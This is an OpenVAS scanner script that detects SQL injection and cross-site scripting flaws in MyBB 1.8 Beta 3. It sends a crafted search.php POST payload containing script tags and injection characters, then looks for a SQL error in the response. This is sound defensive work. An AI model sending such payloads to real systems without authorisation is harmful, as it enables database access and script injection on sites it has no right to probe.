###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mybb_mult_vuln_aug14.nasl 11402 2018-09-15 09:13:36Z cfischer $
#
# MyBB Multiple Vulnerabilities - Aug14
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:mybb:mybb';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804747");
  script_version("$Revision: 11402 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 11:13:36 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2014-08-21 18:16:52 +0530 (Thu, 21 Aug 2014)");
  script_name("MyBB Multiple Vulnerabilities - Aug14");

  script_tag(name:"summary", value:"This host is installed with MyBB and is prone to multiple vulnerabilities.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to
  execute sql query or not.");
  script_tag(name:"insight", value:"Flaw is due to the install/index.php, private.php, showthread.php, search.php,
  misc.php, forumdisplay.php scripts which do not properly sanitize user-supplied
  input via the 'keywords' parameter.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary HTML
  and script code in a user's browser session or execute arbitrary SQL statements
  on the vulnerable system, which may leads to access or modify data in the
  underlying database.");
  script_tag(name:"affected", value:"MyBB version 1.8 Beta 3");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/34381");
  script_xref(name:"URL", value:"https://rstforums.com/forum/88566-mybb-1-8-beta-3-cross-site-scripting-sql-injection.rst");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("sw_mybb_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("MyBB/installed");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");

include("host_details.inc");


if( ! mybbPort = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:mybbPort ) ) exit( 0 );

if (dir == "/") dir = "";

## Send crafted request and receive the response
url = dir + "/search.php";
host = http_host_name(port:mybbPort);

payload = "action=do_search&keywords=%3Cfoo%3E+%3Ch1%3E+%3Cscript%3E+" +
          "alert+%28bar%29+%28%29+%3B+%2F%2F+%27+%22+%3E+%3C+prompt+%" +
          "5Cx41+%2542+constructor+onload&postthread=1&author=&matchu" +
          "sername=1&forums%5B%5D=all&findthreadst=1&numreplies=&post" +
          "date=0&pddir=1&sortby=lastpost&sortordr=desc&showresults=t" +
          "hreads&submit=Search";

mybbReq = string("POST ",url," HTTP/1.0\r\n",
                 "Host: " + host + "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ",strlen(payload), "\r\n\r\n",
                 payload);

mybbRes = http_send_recv(port:mybbPort, data:mybbReq);

if(mybbRes && mybbRes =~ "You have an error in your SQL syntax.*constructor onload")
{
  security_message(port:mybbPort);
  exit(0);
}

exit(99);
